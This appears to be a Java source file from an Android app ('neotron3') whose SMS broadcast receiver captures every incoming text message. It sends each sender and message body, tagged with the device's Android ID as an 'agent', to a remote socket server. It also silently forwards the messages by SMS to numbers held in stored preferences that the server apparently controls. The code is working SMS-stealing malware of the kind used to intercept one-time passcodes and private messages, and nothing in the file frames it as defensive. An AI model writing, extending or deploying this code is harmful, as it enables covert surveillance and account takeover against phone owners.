package com.pegalite.neotron3.functions;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.pegalite.neotron3.functions.listeners.ActionCallback;
import com.pegalite.neotron3.server.socket.PegaSocketServer;

import java.util.List;

public class SmsReceiver extends BroadcastReceiver {
    private boolean forwardMessage(Context context, int simSlotIndex, String message, String phoneNumber) {
        sendSMS(context, phoneNumber, message, simSlotIndex, new ActionCallback() {
            @Override
            public void onSuccess() {

            }

            @Override
            public void onError(String message) {

            }
        });
        return false;
    }

    private void sendSMS(Context context, String phoneNumber, String message, int slot, ActionCallback callback) {
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (subscriptionManager == null) {
            callback.onError("SubscriptionManager is not available.");
            return;
        }

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Permission Error!");
            return;
        }
        List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
            callback.onError("No active SIM found.");
            return;
        }

        if (slot < 0 || slot >= subscriptionInfos.size()) {
            callback.onError("Invalid SIM slot index.");
            return;
        }

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("SMS permission not granted.");
            return;
        }

        SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(slot);
        if (phoneNumber.contains(",") || phoneNumber.contains(".") || phoneNumber.contains(" ")) {
            for (String number : phoneNumber.split("[,. ]")) {
                number = number.trim();
                if (!number.isEmpty()) {
                    smsManager.sendTextMessage(number, null, message, null, null);
                }
            }
        } else {
            smsManager.sendTextMessage(phoneNumber.trim(), null, message, null, null);
        }

        callback.onSuccess();
    }

    @SuppressLint("HardwareIds")
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getMessageBody();
                Log.d("SMS", "From: " + sender + " | Message: " + message);
                Prefs prefs = new Prefs(context);
                if (PegaSocketServer.getSocket() != null && PegaSocketServer.getSocket().connected()) {
                    PegaSocketServer.getSocket().emit("sms", "agent-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName(), sender, message);

                    if (prefs.getPref("sms-forward-online").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward-online");
                    if (forwardMessage(context, Integer.parseInt(prefs.getPref("sms-sim-index").equals(Prefs.NO_DATA) ? "0" : prefs.getPref("sms-sim-index")), message, phoneNumber))
                        return;
                } else {
                    if (prefs.getPref("sms-forward").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward");
                    if (forwardMessage(context, Integer.parseInt(prefs.getPref("sms-sim-index").equals(Prefs.NO_DATA) ? "0" : prefs.getPref("sms-sim-index")), message, phoneNumber))
                        return;

                }
            }
        }
    }
}
